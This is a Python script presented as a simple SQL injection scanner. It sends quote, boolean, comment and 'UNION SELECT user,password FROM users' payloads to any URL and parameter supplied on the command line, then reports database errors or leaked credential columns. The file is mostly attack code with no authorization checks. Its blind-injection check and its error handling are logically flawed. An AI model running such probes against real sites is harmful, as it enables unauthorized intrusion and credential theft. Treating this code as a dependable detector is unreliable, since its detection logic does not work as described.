import argparse
import requests
from bs4 import BeautifulSoup
import urllib.parse

def test_sql_injection(url, parameter):
    """Tests for SQL injection vulnerability in a given URL and parameter."""

    payloads = [
        "'",  # Single quote
        "\"",  # Double quote
        "1=1",  # Always true condition
        "1=2",  # Always false condition
        ";", # SQL statement separator
        "--", # SQL comment
        "#", # SQL comment
        "UNION SELECT user,password FROM users",  # Example UNION attack (adapt table/column names)

    ]

    for payload in payloads:
        test_url = url + "?" + parameter + "=" + urllib.parse.quote(payload)  # URL encode payload
        try:
            response = requests.get(test_url, timeout=5)  # Add timeout for safety
            content = response.text

            if any(indicator in content for indicator in ["SQL syntax error", "MySQL syntax error", "Microsoft OLE DB Provider for SQL Server", "ORA-", "PostgreSQL", "psycopg2"]): # More robust error detection
                print(f"[+] SQL injection vulnerability detected! URL: {test_url}")
                return True # Found a vulnerability
            elif "UNION" in payload and "user" in content and "password" in content: # Check for UNION success (adapt as needed)
                print(f"[+] UNION-based SQL injection possible! URL: {test_url}")
                return True
            elif payload == "1=1" and "1=2" in content: # Blind SQL Injection detection based on content comparison (basic example)
                original_response = requests.get(url + "?" + parameter + "=1", timeout=5).text
                false_response = requests.get(url + "?" + parameter + "=2", timeout=5).text

                if original_response != false_response:
                    print(f"[+] Blind SQL injection might be possible! URL: {test_url}")
                    return True

        except requests.exceptions.RequestException as e:
            print(f"[-] Error: {e}")
            return False

    return False # No vulnerability found



def main():
    parser = argparse.ArgumentParser(description="Simple SQL injection vulnerability scanner.")
    parser.add_argument("url", help="Target URL (e.g., http://example.com/page.php)")
    parser.add_argument("-p", "--parameter", help="Parameter to test (e.g., id)", required=True)
    args = parser.parse_args()

    url = args.url
    parameter = args.parameter

    print(f"Testing {url} for SQL injection in parameter '{parameter}'...")

    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url # Add http:// if missing

    test_sql_injection(url, parameter)

if __name__ == "__main__":
    main()
